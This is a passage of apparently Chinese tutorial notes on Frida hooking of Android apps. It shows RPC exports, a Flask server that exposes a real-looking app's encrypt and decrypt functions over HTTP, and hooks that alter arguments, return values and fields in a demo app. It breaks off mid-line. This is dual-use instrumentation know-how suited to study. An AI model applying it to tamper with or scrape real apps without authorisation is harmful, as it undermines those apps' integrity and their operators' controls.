想要把perform内的方法的返回值在py中printf，需要send(result)</p><p>rpc使python主动调用js中的函数</p><p>js脚本中需添加如下命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpc.<span class="property">exports</span>=&#123;<span class="attr">xxxfunc1</span>:func1,</span><br><span class="line">             <span class="attr">xxxfunc2</span>:func2,</span><br><span class="line">            &#125;                        </span><br></pre></td></tr></table></figure><p>py中添加如下命令</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script.exports.xxxfunc1()</span><br><span class="line">script.exports.xxxfunc2()</span><br></pre></td></tr></table></figure><h2 id="配置flask实现HTTP接口调用">配置flask实现HTTP接口调用</h2><p>首先需要再js代码中实现一个主动调用，且rpc.exports{xxx:xxx,yyy:yyy,}</p><p>然后py代码中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js = <span class="built_in">open</span>(<span class="string">&#x27;test.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>).read()</span><br><span class="line"><span class="comment"># session = frida.get_usb_device().attach(&#x27;me.ele&#x27;)</span></span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&#x27;com.wjmt.app&#x27;</span>)</span><br><span class="line">script = session.create_script(js)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#data解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    res = script.exports.xxx(postdata) //要rpc的函数</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#url加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(postdata)</span><br><span class="line">    res = script.exports.yyy(postdata)   ////要rpc的函数</span><br><span class="line">    <span class="keyword">return</span> res  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br><span class="line">执行：</span><br><span class="line">curl -s -X POST <span class="string">&quot;http://127.0.0.1:5000/函数名&quot;</span> -H <span class="string">&quot;Content-Type:application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;data&quot;:&quot;传递参数&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">函数名 ==》 python中的app.route声明的名字</span><br></pre></td></tr></table></figure><h2 id="获得Context：">获得Context：</h2><p>var context=Java.use(“android.app.ActivityThread”).currentApplication().getApplicationContext();</p><p>原因：Java.use(“android.app.ActivityThread”).currentApplication()返回类型Application，跟进Application发现它继承ContextWrapper，而里面有个getApplicationContext方法返回Context</p><h1>Hook java层</h1><p>demo：43课的HookTestDemo</p><h2 id="函数调用栈">函数调用栈</h2><p>java中打印调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>();  <span class="comment">//其中可以传入一个字符串 然后在catch中 通过e.getMessage()获得。</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     e.printStackTrace();  <span class="comment">//logcat中打印</span></span><br><span class="line">     <span class="keyword">for</span> (StackTraceElement stackTraceElement : e.getStackTrace()) &#123;</span><br><span class="line">         Log.d(TAG, stackTraceElement);</span><br><span class="line">     &#125; </span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="type">String</span> <span class="variable">stackTraceString</span> <span class="operator">=</span> Log.getStackTraceString(<span class="keyword">new</span> <span class="title class_">Throwable</span>()/<span class="keyword">new</span> <span class="title class_">Exception</span>());</span><br><span class="line">Log.d(<span class="string">&quot;StackTrace&quot;</span>, stackTraceString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数调用栈 1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> stack = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>).$new());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 2</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> log = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> t = throwable.$new()</span><br><span class="line">log.<span class="title function_">d</span>(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="string">&#x27;Stack Dump&#x27;</span>,log.<span class="title function_">getStackTraceString</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 3</span></span><br><span class="line"><span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 4</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new();</span><br><span class="line">    <span class="keyword">var</span> stacks=e.<span class="title function_">getStackTrace</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(stacks.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/,/g</span>,<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida构造普通方法">frida构造普通方法</h2><p>demo为xjb第十四课</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalc：&#x27;</span>,a,b); <span class="comment">//输出原来的参数</span></span><br><span class="line">            a=<span class="number">2000</span>;    <span class="comment">//修改参数</span></span><br><span class="line">            b=<span class="number">3000</span>;    <span class="comment">//修改参数</span></span><br><span class="line">            <span class="keyword">var</span> retval=<span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a,b); <span class="comment">//存放修改参数后 函数的返回值</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retval：&#x27;</span>,retval); <span class="comment">//输出修改后返回值 5000</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;                   <span class="comment">//让手机中回显4000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br></pre></td></tr></table></figure><h2 id="frida构造函数以及重载函数">frida构造函数以及重载函数</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        <span class="title class_">Money</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Money：&#x27;</span>,a,b);</span><br><span class="line">            a = <span class="string">&#x27;欧元&#x27;</span>;</span><br><span class="line">            b = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(a,b);   </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $init 构造函数  overload 重载</span></span><br></pre></td></tr></table></figure><h2 id="frida实例化对象">frida实例化对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook普通函数与修改函数参数返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooketst1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalc: &#x27;</span>, a, b);</span><br><span class="line">            <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> infoStr = money.$new(<span class="string">&#x27;RMB&#x27;</span>, <span class="number">1000</span>).<span class="title function_">getInfo</span>();    <span class="comment">//对象实例化,</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;infoStr: &#x27;</span>, infoStr);</span><br><span class="line">            a = <span class="number">2000</span>;</span><br><span class="line">            b = <span class="number">3000</span>;</span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a, b);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retval: &#x27;</span>, retval);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hook构造函数以及重载函数的HOOK</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str, num</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(str, num);</span><br><span class="line">            str = <span class="string">&quot;欧元&quot;</span>;</span><br><span class="line">            num = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(str, num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hook方法的所有重载">Hook方法的所有重载</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(utils.test.overloads.length);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; utils.<span class="property">test</span>.<span class="property">overloads</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            utils.<span class="property">test</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(JSON.stringify(arguments)); //输出参数 </span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有参数&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;调用了没有参数的&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;Money&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//有</span></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;调用了Money参数的&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;调用了Money参数的&quot;</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;调用了int参数的&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;调用了int参数的&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest3</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//arguments可以类比成一个数组用，arguments[0]...</span></span><br><span class="line"><span class="comment">//JSON.stringify JSON对象或值转化为js字符串</span></span><br></pre></td></tr></table></figure><h2 id="Hook修改类的字段">Hook修改类的字段</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改类的字段</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">flag</span>.<span class="property">value</span> = <span class="string">&quot;zxk1ng&quot;</span>;  <span class="comment">//修改静态字段用.value。 money.flag被frida封装为对象</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(money.<span class="property">flag</span>.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;  <span class="comment">//每次找到一个对象就会调用这个函数</span></span><br><span class="line">                obj.<span class="property">_name</span>.<span class="property">value</span> = <span class="string">&quot;ouyuan&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.<span class="property">num</span>.<span class="property">value</span> = <span class="number">888</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest5</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hook内部类与匿名类">Hook内部类与匿名类</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook匿名类  在匿名类前面 + ‘$’</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money$innerClass&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(innerClass);</span></span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            a = <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">            b = <span class="number">666</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xxx = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MainActivity$1&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(xxx);</span></span><br><span class="line">        xxx.<span class="property">getInfo</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;匿名类被Hook了&quot;</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如何定位匿名函数位置：看匿名类的外部类，在smali代码中搜索 外部类$1/2/3...</span></span><br></pre></td></tr></table></figure><h2 id="Hook参数是对象的情况">Hook参数是对象的情况</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>();  <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="number">111</span>);  <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="title class_">Money</span>.$new(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="number">888</span>));   <span class="comment">//主动调用</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="title 